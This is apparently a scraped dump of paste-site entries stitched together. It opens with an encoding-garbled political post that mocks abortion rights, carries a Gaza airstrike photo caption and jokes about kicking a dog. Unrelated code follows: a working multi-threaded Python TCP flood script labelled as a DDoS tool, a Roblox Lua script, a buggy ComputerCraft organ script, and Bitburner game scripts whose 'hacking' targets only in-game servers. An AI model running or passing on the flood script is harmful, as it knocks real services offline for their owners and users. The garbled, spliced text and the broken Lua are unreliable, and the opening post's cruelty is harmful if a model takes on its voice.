A‚Äéc‚Äéc‚Äéo‚Äér‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéU‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé ‚ÄéC‚Äéo‚Äén‚Äés‚Äét‚Äéi‚Äét‚Äéu‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äép‚Äép‚Äéo‚Äéi‚Äén‚Äét‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéa‚Äé ‚Äéb‚Äéo‚Äéd‚Äéy‚Äé ‚Äéo‚Äéf‚Äé ‚Äén‚Äéi‚Äén‚Äée‚Äé ‚Äéo‚Äél‚Äéd‚Äé ‚Äér‚Äéi‚Äéc‚Äéh‚Äé ‚Äéw‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚Äém‚Äée‚Äén‚Äé ‚Äé(‚Äés‚Äéo‚Äém‚Äée‚Äét‚Äéi‚Äém‚Äée‚Äés‚Äé ‚Äéw‚Äéo‚Äém‚Äée‚Äén‚Äé ‚Äéo‚Äér‚Äé ‚Äéb‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚Äép‚Äée‚Äér‚Äés‚Äéo‚Äén‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚Äéa‚Äé ‚Äél‚Äéi‚Äéb‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äéi‚Äés‚Äé ‚Äép‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äés‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äéo‚Äél‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äér‚Äéi‚Äéc‚Äéh‚Äé)‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äék‚Äée‚Äép‚Äét‚Äé ‚Äéa‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé ‚Äép‚Äéa‚Äés‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéa‚Äét‚Äéu‚Äér‚Äéa‚Äél‚Äé ‚Äés‚Äép‚Äéa‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚Äém‚Äéo‚Äér‚Äét‚Äéa‚Äél‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äéb‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚ÄéA‚Äér‚Äét‚Äés‚Äé.‚Äé ‚ÄéA‚Äé ‚Äév‚Äéo‚Äét‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äé5‚Äé‚Äì‚Äé4‚Äé ‚Äéi‚Äés‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äéw‚Äén‚Äé ‚ÄéA‚Äél‚Äé ‚ÄéG‚Äéo‚Äér‚Äée‚Äé.‚Äé

(‚Äé(‚Äé ‚ÄéL‚ÄéO‚ÄéL‚Äé,‚Äé ‚ÄéN‚Äéo‚Äé ‚ÄéA‚Äéb‚Äéo‚Äér‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé!‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

T‚Äéh‚Äée‚Äé ‚Äéb‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äén‚Äé ‚Äéo‚Äén‚Äég‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äée‚Äér‚Äéi‚Äéa‚Äél‚Äé ‚Äéb‚Äéo‚Äém‚Äéb‚Äéa‚Äér‚Äéd‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéc‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé ‚ÄéS‚Äét‚Äér‚Äéi‚Äép‚Äé ‚Äéb‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äéi‚Äé ‚ÄéA‚Äéi‚Äér‚Äé ‚ÄéF‚Äéo‚Äér‚Äéc‚Äée‚Äé ‚Äéd‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé‚Äì‚ÄéH‚Äéa‚Äém‚Äéa‚Äés‚Äé ‚Äéw‚Äéa‚Äér‚Äé.‚Äé ‚ÄéD‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äég‚Äé,‚Äé ‚Äéw‚Äéh‚Äéi‚Äéc‚Äéh‚Äé ‚Äéb‚Äée‚Äég‚Äéa‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚Äé7‚Äé ‚ÄéO‚Äéc‚Äét‚Äéo‚Äéb‚Äée‚Äér‚Äé ‚Äé2‚Äé0‚Äé2‚Äé3‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéa‚Äé ‚ÄéH‚Äéa‚Äém‚Äéa‚Äés‚Äé-‚Äél‚Äée‚Äéd‚Äé ‚Äéa‚Äét‚Äét‚Äéa‚Äéc‚Äék‚Äé ‚Äéo‚Äén‚Äé ‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé,‚Äé ‚Äéa‚Äéi‚Äér‚Äés‚Äét‚Äér‚Äéi‚Äék‚Äée‚Äés‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äéd‚Äéa‚Äém‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚Äém‚Äéo‚Äés‚Äéq‚Äéu‚Äée‚Äés‚Äé,‚Äé ‚Äés‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äés‚Äé,‚Äé ‚Äéh‚Äéo‚Äés‚Äép‚Äéi‚Äét‚Äéa‚Äél‚Äés‚Äé,‚Äé ‚Äér‚Äée‚Äéf‚Äéu‚Äég‚Äée‚Äée‚Äé ‚Äéc‚Äéa‚Äém‚Äép‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéi‚Äév‚Äéi‚Äél‚Äéi‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äéf‚Äér‚Äéa‚Äés‚Äét‚Äér‚Äéu‚Äéc‚Äét‚Äéu‚Äér‚Äée‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéc‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äéa‚Äér‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äém‚Äéa‚Äéj‚Äéo‚Äér‚Äé ‚Äéh‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äéb‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äés‚Äé,‚Äé ‚Äéi‚Äén‚Äéc‚Äél‚Äéu‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äég‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéD‚Äér‚Äée‚Äés‚Äéd‚Äée‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äéo‚Äék‚Äéy‚Äéo‚Äé ‚Äéd‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéo‚Äér‚Äél‚Äéd‚Äé ‚ÄéW‚Äéa‚Äér‚Äé ‚ÄéI‚ÄéI‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äép‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äés‚Äéh‚Äéo‚Äéw‚Äés‚Äé ‚Äéd‚Äéa‚Äém‚Äéa‚Äég‚Äée‚Äé ‚Äéf‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äéi‚Äé ‚Äéa‚Äéi‚Äér‚Äés‚Äét‚Äér‚Äéi‚Äék‚Äée‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äée‚Äéi‚Äég‚Äéh‚Äéb‚Äéo‚Äér‚Äéh‚Äéo‚Äéo‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äéi‚Äém‚Äéa‚Äél‚Äé ‚Äéi‚Äén‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé ‚ÄéC‚Äéi‚Äét‚Äéy‚Äé ‚Äéo‚Äén‚Äé ‚Äé9‚Äé ‚ÄéO‚Äéc‚Äét‚Äéo‚Äéb‚Äée‚Äér‚Äé ‚Äé2‚Äé0‚Äé2‚Äé3‚Äé.‚Äé

P‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéW‚Äéa‚Äéf‚Äéa‚Äé ‚Äé/‚Äé ‚ÄéA‚ÄéP‚ÄéA‚Äéi‚Äém‚Äéa‚Äég‚Äée‚Äés‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äéy‚Äée‚Äé,‚Äé ‚Äég‚Äéu‚Äéy‚Äés‚Äé.‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äér‚Äée‚Äéc‚Äéo‚Äér‚Äéd‚Äé ‚Äéa‚Äé ‚Äév‚Äéi‚Äéd‚Äée‚Äéo‚Äé ‚Äéo‚Äéf‚Äé ‚Äém‚Äéy‚Äés‚Äée‚Äél‚Äéf‚Äé ‚Äék‚Äéi‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äém‚Äéy‚Äé ‚Äéd‚Äéo‚Äég‚Äé.‚Äé"
r0uZwmEN,fryem.py,betrayed,Python,Saturday 16th of March 2024 08:55:33 PM CDT,"#!/usr/bin/env python3
# Multi-threaded ""TCP-junk"" DDOS flood
# Coded by betrayed
import sys, time, socket, threading
data = """"
_end = False

def heat():
    while True:
        try:
            if _end == True:
              break 
          
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while _end == False:
                s.send(data.encode()) 
                
            s.close()
        except:
            pass

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <SIZE> <TIME> <THREAD/S>\r\n"")
    
    global data, _end
    while len(data) < int(sys.argv[3]):
        data = data + ""?""
    
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n
  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí    ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà     ‚ñì‚ñà‚ñà   ‚ñà‚ñà‚ñì    ‚ñì‚ñà‚ñà‚ñí    ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì
‚ñì‚ñà‚ñà   ‚ñí    ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí    ‚ñí‚ñà‚ñà  ‚ñà‚ñà‚ñí    ‚ñí‚ñà‚ñÄ     ‚ñì‚ñà   ‚ñÄ    ‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí
‚ñí‚ñà‚ñà‚ñà‚ñà ‚ñë    ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí     ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë      ‚ñë     ‚ñí‚ñà‚ñà‚ñà      ‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë
‚ñë‚ñì‚ñà‚ñí  ‚ñë    ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ       ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë    ‚ñë       ‚ñí‚ñì‚ñà  ‚ñÑ    ‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà 
‚ñë‚ñí‚ñà‚ñë       ‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí     ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë           ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí   ‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí
 ‚ñí ‚ñë       ‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë      ‚ñà‚ñà‚ñí‚ñí‚ñí             ‚ñë‚ñë ‚ñí‚ñë ‚ñë   ‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë
 ‚ñë           ‚ñë‚ñí ‚ñë ‚ñí‚ñë    ‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë              ‚ñë ‚ñë  ‚ñë   ‚ñë  ‚ñë      ‚ñë
 ‚ñë ‚ñë         ‚ñë‚ñë   ‚ñë     ‚ñí ‚ñí ‚ñë‚ñë                 ‚ñë      ‚ñë      ‚ñë   
              ‚ñë         ‚ñë ‚ñë                    ‚ñë  ‚ñë          ‚ñë   
                        ‚ñë ‚ñë"""""")
    print(""\r\nThEiR RouTeR i$ SiZZLinG!!! MeLtINg "" + sys.argv[1] + "" @ "" + sys.argv[2] + "" FOr "" + sys.argv[4] + "" sEcoNds...\r\n"")                        

    # start thread/s
    toetagz = []
    i = 0
    while True:
        i +=1
        x = threading.Thread(target=heat)
        toetagz.append(x)
        x.start()
        if i == int(sys.argv[5]):
            break
        
    # wait for attack duration
    dur = time.time() + int(sys.argv[4])
    try:
        while time.time() < dur:
            pass
    except KeyboardInterrupt:
        pass

    # kill all active thread/s
    _end = True
    for y in toetagz:
        try:
            y.join()
        except KeyboardInterrupt:
            pass
        except:
            pass
        
    sys.exit(""\r\nDone.\r\n"")

if __name__ == ""__main__"":
    main()
"
YMbjxvmb,Roblox Artificial Void,scriptingtales,Lua,Saturday 16th of March 2024 08:26:44 PM CDT,"--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k==""script"" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new(""Model"",game:GetService(""Lighting""))
Part0 = Instance.new(""Part"")
BillboardGui1 = Instance.new(""BillboardGui"")
TextLabel2 = Instance.new(""TextLabel"")
Script3 = Instance.new(""Script"")
Part0.Name = ""Voido""
Part0.Parent = mas
Part0.CFrame = CFrame.new(-25.75, 0.125, -29, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part0.Position = Vector3.new(-25.75, 0.125, -29)
Part0.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part0.Size = Vector3.new(9, 0.25, 9)
Part0.Anchored = true
Part0.BottomSurface = Enum.SurfaceType.Smooth
Part0.BrickColor = BrickColor.new(""Really black"")
Part0.Material = Enum.Material.Neon
Part0.TopSurface = Enum.SurfaceType.Smooth
Part0.brickColor = BrickColor.new(""Really black"")
BillboardGui1.Name = ""BillboardGui2""
BillboardGui1.Parent = Part0
BillboardGui1.Size = UDim2.new(0, 400, 0, 100)
BillboardGui1.Active = true
BillboardGui1.ClipsDescendants = true
BillboardGui1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BillboardGui1.Adornee = Part0
BillboardGui1.ExtentsOffsetWorldSpace = Vector3.new(0, 50, 0)
TextLabel2.Name = ""TextWarn""
TextLabel2.Parent = BillboardGui1
TextLabel2.Position = UDim2.new(0, 2, 0, 0)
TextLabel2.Size = UDim2.new(0, 400, 0, 100)
TextLabel2.BackgroundColor = BrickColor.new(""Institutional white"")
TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel2.BackgroundTransparency = 1
TextLabel2.BorderColor = BrickColor.new(""Really black"")
TextLabel2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel2.BorderSizePixel = 0
TextLabel2.Font = Enum.Font.Cartoon
TextLabel2.FontSize = Enum.FontSize.Size14
TextLabel2.Text = ""This is a void, drop any object, it will disintigrate, that includes you!""
TextLabel2.TextColor = BrickColor.new(""Really black"")
TextLabel2.TextColor3 = Color3.new(0, 0, 0)
TextLabel2.TextScaled = true
TextLabel2.TextSize = 14
TextLabel2.TextStrokeColor3 = Color3.new(1, 1, 1)
TextLabel2.TextStrokeTransparency = 0
TextLabel2.TextWrap = true
TextLabel2.TextWrapped = true
Script3.Name = ""VoidEnabler""
Script3.Parent = Part0
table.insert(cors,sandbox(Script3,function()
nan = 0/0

workspace.Voido.RotVelocity = Vector3.new(nan, nan, nan)
workspace.Voido.Velocity = Vector3.new(nan, nan, nan)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
"
zMpeUbwi,ComputerCraft Organ,Omniwyvern,Lua,Saturday 16th of March 2024 08:23:04 PM CDT,"--[[ 
Written by OmniWyvern.
3/16/2024
 
Never written any lua before. this has been fun. lua sucks lmaoooo (I am a spoiled java baby)
Definitely could've been optimized a ton. Not a high priority so I didn't do so.

This is code for an organ made from steam whistles in create.
Uses More Red bundled cables, with low F# being white and high F# being blue, with 3 octaves.
Left side of the computer is the lowest octave, back side is the middle octave, right side is the high octave.
--]]


local notes = {
	[""F#""] = 1,
	[""F""] = 256,
	[""G""] = 128,
	[""G#""] = 32768,
	[""A""] = 4096,
	[""A#""] = 16384,
	[""B""] = 2,
	[""C""] = 16,
	[""C#""] = 32,
	[""D""] = 8192,
	[""D#""] = 512,
	[""E""] = 8,
	[""F""] = 2048,
	[""S""] = 1
}

local octaves = {
	[""L""] = ""left"",
	[""M""] = ""back"",
	[""H""] = ""right"",
	[""S""] = ""top"",
}

-- Sets the number of ticks that the smallest note plays.
-- Done this way cause if a song doesn't need 8th notes I'm not gonna deal with that
local smallestNoteDuration = 4

-- This is the part you need to change for each song. This system sucks. idk how else to do it off the top of my head
-- D1M would indicate a note of D for 1 (smallestNoteDuration) in the middle octave
-- The song put in here right now is the Song of Storms from Ocarina of Time. Works well with the organ midi in Create.
local melody = {
	""D1M"",
	""A1M"",
	""D1H"",
	""S1S"",
	""D1M"",
	""A1M"",
	""D1M""
}

-- F1L&A1L indicates that two notes are played at once. Lets it play chords.
local bassline = {
	""D1L"",
	""F1L&A1L"",
	""F1L&A1L"",
	""D1L"",
	""G2M&B2M""
}

local function playNote(note, duration)
	local noteName = string.sub(note, 1, 1)
	local octaveIndicator = string.sub(note, 3, 3)
	local color = notes[noteName]
	local octave = octaves[octaveIndicator]

	redstone.setBundledOutput(octave, color)
	
	if (string.len(note) > 3) then
		local noteName = string.sub(note, 5, 5)
		local octaveIndicator = string.sub(note, 7, 7)
		local colora = notes[noteName]
		local octave = octaves[octaveIndicator]
		
		redstone.setBundledOutput(octave, color + colora)
	end

	sleep(duration)
	redstone.setBundledOutput(octave, 0)
end


local function playMelody()
	for _, note in ipairs(melody) do
		local durationCode = tonumber(string.sub(note, 2, 2))
		local duration = smallestNoteDuration * durationCode
		playNote(note, duration)
		if (string.len(note) > 3) then
			local durationCode = tonumber(string.sub(note, 5, 5))
			local duration = smallestNoteDuration * durationCode
			playNote(note, duration)
		end
	end
end

local function playBassline()
	for _, notea in ipairs(bassline) do
		local durationC = tonumber(string.sub(notea, 2, 2))
		local durationa = smallestNoteDuration * durationCodeC
		playNote(notea, durationa)
		if (string.len(note) > 3) then
			local durationC = tonumber(string.sub(notea, 5, 5))
			local durationa = smallestNoteDuration * durationC
			playNote(notea, durationa)
		end
	end
end


--	local melodyCoroutine = coroutine.create(playMelody)
	local basslineCoroutine = coroutine.create(playBassline)

while 1 do
--	coroutine.resume(melodyCoroutine)
	coroutine.resume(basslineCoroutine)
end"
uMcJKjDp,bitburner - script collection,spezticle,JavaScript,Saturday 16th of March 2024 08:17:52 PM CDT,"0===================================/infect.js===================================0
/** @param {NS} ns */
export async function main(ns) {
	var hackscript = ""autostart.js"";
	var txt_neighbors = ""neighbors.txt"";
	var txt_hackers = ""hackerservers.txt"";
	var txt_myservers = ""myservers.txt"";
	var neighbors = JSON.parse(ns.read(txt_neighbors));
	var hackerservers = JSON.parse(ns.read(txt_hackers));
	var myservers = JSON.parse(ns.read(txt_myservers));
	var nohack = hackerservers.concat(myservers);
	var retrieve_files = ""files.js"";
	var update_script = ""scp.js"";
	ns.exec(retrieve_files, ""home"");
	ns.exec(update_script, ""home"", 1);
	ns.exec(open_ports, ""home"", 1);
	for (let i = 0; i < neighbors.length; i++) {
		var node = neighbors[i];
		var sur = ns.getServerUsedRam(node).toPrecision(4);
		var smr = ns.getServerMaxRam(node).toPrecision(4);
		var sra = smr - sur; // server ram availabe
		ns.killall(node);
		await ns.sleep(200);
		var sr2r = ns.getScriptRam(hackscript, node);
		if (sr2r < 1) { var sr2r = 1; }
		var rwt = ((sra - sr2r) / sr2r).toFixed(0);
		if (rwt < 1) { var rwt = 1 };
		if (!nohack.includes(node)) {
			ns.exec(hackscript, node, rwt);
		}
	}
}
0===================================infect.js/===================================0
0===================================/files.js===================================0
/** @param {NS} ns */
export async function main(ns) {
	var txt_neighbors = ""neighbors.txt"";
	var txt_hackers = ""hackerservers.txt"";
	var txt_myservers = ""myservers.txt"";
	var neighbors = JSON.parse(ns.read(txt_neighbors));
	var hackerservers = JSON.parse(ns.read(txt_hackers));
	var myservers = JSON.parse(ns.read(txt_myservers));
	var nohack = hackerservers.concat(myservers);
	var filetypes = [""lit"", ""txt"", ""msg"", ""cct""];
	var files = [];
	var contracts = [];
	for (let i = 0; i < filetypes.length; i++) {
		var ext = filetypes[i];
		for (let h = 0; h < neighbors.length; h++) {
			var node = neighbors[h];
			let matches = ns.ls(node, ext);
			if (matches.length > 0) {
				for (let g = 0; g < matches.length; g++) {
					let match = matches[g];
					if (match.includes("".cct"") && !contracts.includes(match)) {
						contracts.push(match);
						//ns.tprint(match)
					} else if (!files.includes(match)) {
						//ns.tprint(match, "" "", node)
						files.push(match);
						//ns.tprint(files.length)
						ns.scp(match, ""home"");
						//ns.tprint(node, ""\n"", ""\t"", match)

					}
				}

			}
			for (let i = 0; i < files.length; i++) {
				let file = files[i];
				ns.scp(file, ""home"", node)
			}
		}
		//ns.tprint(files.length);

	}
}
0===================================/files.js===================================0

1===================================/openports.js===================================1
/** @param {NS} ns */
export async function main(ns) {
	var hacktools = [""BruteSSH.exe"", ""FTPCrack.exe"", ""relaySMTP.exe"", ""HTTPWorm.exe"", ""SQLInject.exe""];
	var neighbors = JSON.parse(ns.read(""neighbors.txt""));
	var hackerservers = JSON.parse(ns.read(""hackerservers.txt""));
	var myservers = JSON.parse(ns.read(""myservers.txt""));
	var nohack = hackerservers.concat(myservers);
	for (let i = 0; i < neighbors.length; i++) {
		let node = neighbors[i];
		//		if (!hackerservers.includes(node)) {
		var count = 0;
		if (ns.fileExists(""BruteSSH.exe"", ""home"")) { ns.brutessh(node); count++; };
		if (ns.fileExists(""FTPCrack.exe"", ""home"")) { ns.ftpcrack(node); count++; };
		if (ns.fileExists(""relaySMTP.exe"", ""home"")) { ns.relaysmtp(node); count++; };
		if (ns.fileExists(""HTTPWorm.exe"", ""home"")) { ns.httpworm(node); count++; };
		if (ns.fileExists(""SQLInject.exe"", ""home"")) { ns.sqlinject(node); count++; };

		if (ns.getServerNumPortsRequired(node) > count) {
			console.log(""Need more hacker tools for "" + node)
		} else { ns.nuke(node) }
	}
}
1===================================openports.js/===================================1
2===================================/scp.js===================================2
/** @param {NS} ns */
export async function main(ns) {
	var txt_neighbors = ""neighbors.txt"";
	var txt_hackers = ""hackerservers.txt"";
	var txt_myservers = ""myservers.txt"";
	var scripts_to_copy = [""hack.js"",""autostart.js"",""weaken.js"", ""grow.js""];
	var scripts_to_del = [""alwaysweaken.js""]
	var neighbors = JSON.parse(ns.read(txt_neighbors));
	var hackerservers = JSON.parse(ns.read(txt_hackers));
	var myservers = JSON.parse(ns.read(txt_myservers));
	var nohack = hackerservers.concat(myservers);
	function copy_files(node) {
		for (let fCount = 0; fCount < scripts_to_copy.length; fCount++) {
			let script = scripts_to_copy[fCount];
			ns.scp(script, node, ""home"");
			if (!ns.fileExists(script, node)) {
				ns.tprint(script, "" failed to copy on "", node);
			};
			
		};
		for (let i = 0; i < scripts_to_del.length; i ++){
			let script = scripts_to_del[i];
			if (ns.fileExists(script,node)){ ns.rm(script,node);}
		}
	};
	for (let iCount = 0; iCount < neighbors.length; iCount++) {
		let node = neighbors[iCount];
		if (!nohack.includes(node)) {
			copy_files(node);
//			delete_files(node);
		};
	};
}
2===================================scp.js/===================================2
3===================================/autostart.js===================================3
/** @param {NS} ns */
export async function main(ns) {
	while (true) {
		var node = ns.getHostname();
		var hackscript = ns.getScriptName();
		var logfile = node + "".txt"";
		var sur = ns.getServerUsedRam(node).toPrecision(4);
		var smr = ns.getServerMaxRam(node).toPrecision(4);
		var ssl = ns.getServerSecurityLevel(node).toPrecision(4);
		var sms = ns.getServerMinSecurityLevel(node).toPrecision(4);
		var smm = ns.getServerMaxMoney(node);
		var sma = ns.getServerMoneyAvailable(node);
		var sra = smr - sur; // server ram availabe
		var security_status = ssl - sms;
		var money_status = smm - sma;
		var sr2r = ns.getScriptRam(hackscript, node);
		if (sr2r < 1) { var sr2r = 1; }
		var rwt = ((sra - sr2r) / sr2r).toFixed(0);
		if (rwt < 1) { var rwt = 1 };
		if (security_status != 0) {
			ns.write(logfile, (""+=====================/Weaken==================+\n""), ""a"");
			ns.write(logfile, (""Security Status: "" + ssl.toLocaleString() + ""-"" + sms.toLocaleString() + "" = "" + (ssl - sms).toLocaleString() + "" != "" + 0 + ""\n""), ""a"");
			ns.write(logfile, ""C "" + ""Start weaken: "" + (await ns.weaken(node)) + ""\n"", ""a"");
			var ssl = ns.getServerSecurityLevel(node).toPrecision(4);
			ns.write(logfile, ""W "" + ""New security level: "" + ssl + ""\n"", ""a"");
			//ns.write(logfile, ""C "" + ""Call "" + autostart + "": "" + (ns.exec(autostart, node)) + ""\n"", ""a"");
			ns.write(logfile, (""+======================Weaken/===================+"" + ""\n""), ""a"");
		} else if (money_status != 0) {
			ns.write(logfile, (""+=====================/Grow==================+\n""), ""a"");
			ns.write(logfile, (""Money Status: "" + smm.toLocaleString() + "" - "" + sma.toLocaleString() + "" = "" + (smm - sma).toLocaleString() + "" != "" + 0 + ""\n""), ""a"")
			ns.write(logfile, ""C "" + ""Start grow: "" + (await ns.grow(node)) + ""\n"", ""a"");
			var sma = ns.getServerMoneyAvailable(node);
			ns.write(logfile, ""G "" + ""Money now available: "" + sma.toLocaleString() + ""\n"", ""a"");
			//ns.write(logfile, ""C "" + ""Call "" + autostart + "": "" + (ns.exec(autostart, node)) + ""\n"", ""a"");
			ns.write(logfile, (""+======================Grow/===================+"" + ""\n""), ""a"");
		} else {
			ns.write(logfile, (""+=====================/Hack==================+\n""), ""a"");
			var ght = ns.getHackTime(node).toPrecision(4);
			ns.write(logfile, ""C "" + ""Start hack: "" + (await ns.hack(node)) + ""\n"", ""a"");
